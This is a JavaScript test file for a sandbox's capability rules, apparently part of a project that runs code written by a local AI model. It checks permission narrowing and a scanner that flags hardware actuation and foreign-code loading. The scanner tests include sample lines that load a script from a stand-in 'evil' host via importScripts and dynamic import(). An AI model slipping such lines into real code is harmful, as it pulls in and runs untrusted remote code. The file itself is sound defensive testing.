// sandbox-caps.test.mjs — the capability contract of the shared in-browser runtime.
//
// Why this exists: per-call capabilities used to be SILENTLY IGNORED. `run(code, env, {caps:{…}})`
// parsed only `opts.mode`, so ANIMA Forge's verify loop — which passes {fs:false,http:false,
// anima:false} precisely because it is about to run code a small local model just wrote — actually
// ran that code with the runner's full authority. And `createRunner` defaults `hw:true`, so the
// callers that denied "everything" still left the IR blaster / GPIO / Wi-Fi radio reachable.
//
// These tests lock both halves down: narrowing works, and widening is impossible.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CAP_KEYS, narrowCaps } from '../../apps/code-runner/www/nucleo-run.js';
import { inferCapabilities, scanDangers, assess } from '../../apps/anima/www/forge/capguard.js';

const FULL = { fs: true, http: true, anima: true, notify: true, hw: true };

test('hw is a first-class capability, not runner config', () => {
  assert.ok(CAP_KEYS.includes('hw'), 'hw must be part of the capability set');
});

test('no override → the runner keeps exactly what it was built with', () => {
  assert.deepEqual(narrowCaps(FULL, null), FULL);
  assert.deepEqual(narrowCaps({ fs: true }, undefined), { fs: true, http: false, anima: false, notify: false, hw: false });
});

test('a per-run override NARROWS', () => {
  const c = narrowCaps(FULL, { fs: false, http: false, anima: false });
  assert.equal(c.fs, false);
  assert.equal(c.http, false);
  assert.equal(c.anima, false);
  assert.equal(c.notify, true, 'untouched capabilities survive the override');
});

test('a per-run override can NEVER widen', () => {
  const base = { fs: false, http: false, anima: false, notify: false, hw: false };
  const c = narrowCaps(base, { fs: true, http: true, hw: true, anima: true, notify: true });
  for (const k of CAP_KEYS) assert.equal(c[k], false, k + ' must stay denied');
});

test('the Forge verify shape denies hardware even when the runner allowed it', () => {
  // What forge/loop.js passes per call. Before the fix this was a no-op AND hw defaulted to true.
  const c = narrowCaps(FULL, { fs: false, http: false, anima: false, hw: false });
  assert.equal(c.hw, false);
  assert.equal(c.fs, false);
});

test('capguard infers os.hw.* as a capability', () => {
  assert.ok(inferCapabilities('await os.hw.ir.send({protocol:"nec"})').includes('hw'));
  assert.ok(inferCapabilities('os.hw["gpio"].write({pin:1,value:1})').includes('hw'));
  assert.ok(!inferCapabilities('console.log(1+1)').includes('hw'));
});

test('capguard reports hardware actuation and over-privilege', () => {
  const kinds = scanDangers('await os.hw.gpio.write({pin:2,value:1})').map((d) => d.kind);
  assert.ok(kinds.includes('hardware-actuation'));
  const a = assess('await os.hw.ir.tvbgone()', { granted: ['fs.read'] });
  assert.ok(a.over.includes('hw'), 'hw used but not granted → over-privilege');
  // F2 (2026-08-18): ungranted hardware actuation is now a hard BLOCK, not a warning — it acts on the
  // room and cannot be contained by the sandbox the way an over-reaching fs read can.
  assert.equal(a.severity, 'block');
  assert.equal(a.hwOverreach, true);
  // a NON-hardware over-reach stays a warning (the block is specific to os.hw)
  assert.equal(assess('os.notify("hi")', { granted: [] }).severity, 'warn');
});

test('capguard blocks BOTH ways to pull in foreign code', () => {
  const k1 = scanDangers('importScripts("http://evil/x.js")').map((d) => d.kind);
  const k2 = scanDangers('const m = await import("http://evil/x.js")').map((d) => d.kind);
  assert.ok(k1.includes('dynamic-import'));
  assert.ok(k2.includes('dynamic-import'), 'dynamic import() is the escape hatch that still works');
  // A property named "import" (or a word ending in it) must not trip the scanner.
  assert.ok(!scanDangers('const n = cfg.import(1)').map((d) => d.kind).includes('dynamic-import'));
});
